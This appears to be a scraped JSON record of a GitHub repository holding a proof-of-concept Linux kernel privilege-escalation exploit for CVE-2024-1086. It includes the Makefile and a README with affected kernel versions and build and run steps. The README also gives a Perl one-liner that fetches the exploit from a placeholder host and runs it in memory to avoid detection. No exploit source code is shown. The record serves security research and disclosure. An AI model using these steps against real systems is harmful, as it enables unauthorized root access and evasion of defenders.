@@ -1,0 +1,57 @@
+{
+  "metadata": {
+    "timestamp": 1736709960539,
+    "page": 507,
+    "hasNextPage": true,
+    "endCursor": "Y3Vyc29yOjUxMA==",
+    "completionStatus": "IN_PROGRESS"
+  },
+  "repositories": [
+    {
+      "nameWithOwner": "Notselwyn/CVE-2024-1086",
+      "stars": 2328,
+      "defaultBranch": "main",
+      "files": [
+        {
+          "name": ".gitignore",
+          "type": "blob",
+          "size": 0.0126953125,
+          "content": "exploit\n*.log"
+        },
+        {
+          "name": "LICENSE",
+          "type": "blob",
+          "size": 1.041015625,
+          "content": "MIT License\n\nCopyright (c) 2024 Notselwyn\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n"
+        },
+        {
+          "name": "Makefile",
+          "type": "blob",
+          "size": 1.0458984375,
+          "content": "SRC_FILES := src/main.c src/env.c src/net.c src/nftnl.c src/file.c\nOUT_NAME = ./exploit\n\n# use musl-gcc since statically linking glibc with gcc generated invalid opcodes for qemu\n#   and dynamically linking raised glibc ABI versioning errors\nCC = musl-gcc\n\n# use custom headers with fixed versions in a musl-gcc compatible manner\n# - ./include/libmnl: libmnl v1.0.5\n# - ./include/libnftnl: libnftnl v1.2.6\n# - ./include/linux-lts-6.1.72: linux v6.1.72\nCFLAGS = -I./include -I./include/linux-lts-6.1.72 -Wall -Wno-deprecated-declarations\n\n# use custom object archives compiled with musl-gcc for compatibility. normal ones \n#   are used with gcc and have _chk funcs which musl doesn't support\n# the versions are the same as the headers above\nLIBMNL_PATH = ./lib/libmnl.a\nLIBNFTNL_PATH = ./lib/libnftnl.a\n\nexploit: _compile_static _strip_bin\nrun: _run_outfile\nclean: _clean_outfile\n\n_compile_static:\n\t$(CC) $(CFLAGS) $(SRC_FILES) -o $(OUT_NAME) -static $(LIBNFTNL_PATH) $(LIBMNL_PATH)\n_strip_bin:\n\tstrip $(OUT_NAME)\n_run_outfile:\n\t$(OUT_NAME)\n_clean_outfile:\n\trm $(OUT_NAME)"
+        },
+        {
+          "name": "README.md",
+          "type": "blob",
+          "size": 3.7978515625,
+          "content": "# CVE-2024-1086\n\nUniversal local privilege escalation Proof-of-Concept exploit for [CVE-2024-1086](https://nvd.nist.gov/vuln/detail/CVE-2024-1086), working on most Linux kernels between v5.14 and v6.6, including Debian, Ubuntu, and KernelCTF. The success rate is 99.4% in KernelCTF images.\n\nhttps://github.com/Notselwyn/CVE-2024-1086/assets/68616630/a3d43951-94ab-4c09-a14b-07b81f89b3de\n\n## Blogpost / Write-up\n\nA full write-up of the exploit - including background information and loads of useful diagrams - can be found in the [Flipping Pages blogpost](https://pwning.tech/nftables/).\n\n\n## Affected versions\n\nThe exploit affects versions from (including) v5.14 to (including) v6.6, excluding patched branches v5.15.149>, v6.1.76>, v6.6.15>. The patch for these versions were released in feb 2024. The underlying vulnerability affects all versions (excluding patched stable branches) from v3.15 to v6.8-rc1.\n\n**Caveats:**\n- The exploit does not work on v6.4> kernels with kconfig `CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y` (including Ubuntu v6.5)\n- The exploits requires user namespaces (kconfig `CONFIG_USER_NS=y`), that those user namespaces are unprivileged (sh command `sysctl kernel.unprivileged_userns_clone` = 1), and that nf_tables is enabled (kconfig `CONFIG_NF_TABLES=y`). By default, these are all enabled on Debian, Ubuntu, and KernelCTF. Other distro's have not been tested, but may work as well. Additionally, the exploit has only been tested on x64/amd64.\n- The exploit may be *very* unstable on systems with a lot of network activity\n\t- Systems with WiFi adapter, when surrounded by high-usage WiFi networks, will be very unstable. \n\t- On test devices, please turn off WiFi adapters through BIOS.\n- The kernel panic (system crash) after running the exploit is a side-effect which deliberately hasn't been fixed to prevent malicious usage of the exploit (i.e. exploitation attempts should now be more noticable, and unpractical in real-world operations). Despite this, it still allows for a working proof-of-concept in lab environments, as the root shell is functional, and persistence through disk is possible.\n\n## Usage\n\n### Configuration\n\nThe default values should work out of the box on Debian, Ubuntu, and KernelCTF with a local shell. On non-tested setups/distros, please make sure the kconfig values match with the target kernel. These can be specified in [`src/config.h`](/src/config.h). If you are running the exploit on a machine with more than 32GiB physical memory, make sure to increase `CONFIG_PHYS_MEM`.\nIf you are running the exploit over SSH (into the test machine) or a reverse shell, you may want to toggle `CONFIG_REDIRECT_LOG` to `1` to avoid unnecessary network activity.\n\n### Building\n\nIf this is impractical for you, there is an [compiled x64 binary](https://github.com/Notselwyn/CVE-2024-1086/releases/download/v1.0.0/exploit) with the default config.\n\n```bash\ngit clone https://github.com/Notselwyn/CVE-2024-1086\ncd CVE-2024-1086\nmake\n```\n\nBinary: `CVE-2024-1086/exploit`\n\n\n### Running\n\nRunning the exploit is just as trivial:\n\n```bash\n./exploit\n```\n\nFileless execution is also supported, in case of pentest situations where detections need to be avoided. However, Perl needs to be installed on the target:\n```bash\nperl -e '\n  require qw/syscall.ph/;\n\n  my $fd = syscall(SYS_memfd_create(), $fn, 0);\n  system \"curl https://example.com/exploit -s >&$fd\";\n  exec {\"/proc/$$/fd/$fd\"} \"memfd\";\n'\n```\n\n## Disclaimer\n\nThe programs and scripts (\"programs\") in this software directory/folder/repository (\"repository\") are published, developed and distributed for educational/research purposes only. I (\"the creator\") do not condone any malicious or illegal usage of the programs in this repository, as the intend is sharing research and not doing illegal activities with it. I am not legally responsible for anything you do with the programs in this repository.\n"
+        },
+        {
+          "name": "include",
+          "type": "tree",
+          "content": null
+        },
+        {
+          "name": "lib",
+          "type": "tree",
+          "content": null
+        },
+        {
+          "name": "src",
+          "type": "tree",
+          "content": null
+        }
+      ]
+    }
+  ]
+}
